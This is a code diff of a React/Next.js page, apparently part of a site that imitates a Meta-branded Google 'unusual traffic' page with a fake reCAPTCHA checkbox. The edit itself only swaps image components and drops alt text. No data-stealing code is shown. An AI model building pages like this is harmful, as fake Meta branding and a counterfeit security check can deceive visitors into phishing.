@@ -2,8 +2,8 @@
 import CheckMarkImage from '@/assets/images/checkmark.png';
 import MetaImage from '@/assets/images/meta-image.png';
 import ReCaptchaImage from '@/assets/images/recaptcha.png';
-import Thumbnail from '@/components/thumbnail';
 import axios from 'axios';
+import Image from 'next/image';
 import { useRouter } from 'next/navigation';
 import { useEffect, useState, type FC } from 'react';
 const Index: FC = () => {
@@ -40,7 +40,7 @@ const Index: FC = () => {
         <div className='flex flex-col items-center justify-center pt-[150px]'>
             <title>Our systems have detected unusual traffic from your computer network</title>
             <div className='w-[300px]'>
-                <Thumbnail src={MetaImage} alt='Meta Logo' width={64} height={16} quality={90} className='w-16' priority />
+                <Image src={MetaImage} alt='' className='w-16' />
                 <div className='flex w-full items-center justify-start py-5'>
                     <div className='flex w-full items-center justify-between rounded-md border-2 bg-[#f9f9f9] pr-2 text-[#4c4a4b]'>
                         <div className='flex items-center justify-start'>
@@ -68,7 +68,7 @@ const Index: FC = () => {
                             <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-normal text-gray-500'>I&apos;m not a robot</div>
                         </div>
                         <div className='mt-2 mb-0.5 ml-4 flex flex-col items-center self-end text-[#9d9ba7]'>
-                            <Thumbnail src={ReCaptchaImage} alt='reCAPTCHA Logo' width={40} height={40} quality={85} className='h-10 w-10' />
+                            <Image src={ReCaptchaImage} alt='' className='h-10 w-10' />
                             <p className='text-[10px] font-bold'>reCAPTCHA</p>
                             <small className='text-[8px] text-gray-500'>Privacy - Terms</small>
                         </div>
